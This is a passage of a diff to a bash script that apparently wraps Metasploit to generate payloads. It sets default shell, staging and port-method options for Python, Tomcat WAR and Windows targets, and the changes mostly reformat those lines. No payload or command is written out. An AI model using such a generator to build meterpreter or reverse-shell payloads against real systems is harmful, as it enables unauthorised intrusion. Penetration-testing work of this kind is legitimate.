   if [[ "${STAGE}" == "staged" && "${SHELL}" == "shell" ]]; then
     echo -e " ${YELLOW}[i]${RESET} Unable to do ${STAGE} ${SHELL} Python. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
@@ -739,8 +813,11 @@ elif [[ "${TYPE}" == "python" || "${TYPE}" == "py" ]]; then
 
 ## Tomcat
 elif [[ "${TYPE}" == "tomcat" || "${TYPE}" == "war" ]]; then
-  [[ -z "${SHELL}" ]] && SHELL="meterpreter"
-  [[ -z "${STAGE}" ]] && STAGE="staged" && _STAGE="/"
+  [[ -z "${SHELL}" ]] \
+    && SHELL="meterpreter"
+  [[ -z "${STAGE}" ]] \
+    && STAGE="staged" \
+    && _STAGE="/"
   # Cant do: stageless meterpreter // stageless bind // find_ports    (Invalid Payload Selected)
   if [[ "${STAGE}" == "stageless" && "${SHELL}" == "meterpreter" ]]; then
     echo -e " ${YELLOW}[i]${RESET} Unable to do ${STAGE} ${SHELL} Tomcat. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
@@ -757,9 +834,13 @@ elif [[ "${TYPE}" == "tomcat" || "${TYPE}" == "war" ]]; then
 
 ## Windows
 elif [[ "${TYPE}" == "windows" || "${TYPE}" == "win" || "${TYPE}" == "exe" || "${TYPE}" == "dll" || "${TYPE}" == "srv" ]]; then
-  [[ -z "${SHELL}" ]] && SHELL="meterpreter"
-  [[ -z "${STAGE}" ]] && STAGE="staged" && _STAGE="/"
-  [[ "${METHOD}" == "find_port" ]] && METHOD="allports"
+  [[ -z "${SHELL}" ]] \
+    && SHELL="meterpreter"
+  [[ -z "${STAGE}" ]] \
+    && STAGE="staged" \
+    && _STAGE="/"
+  [[ "${METHOD}" == "find_port" ]] \
+    && METHOD="allports"
   # Its able todo anything that you throw at it =).
   FILEEXT="exe"
   [[ "${TYPE}" == "dll" ]] && FILEEXT="dll"
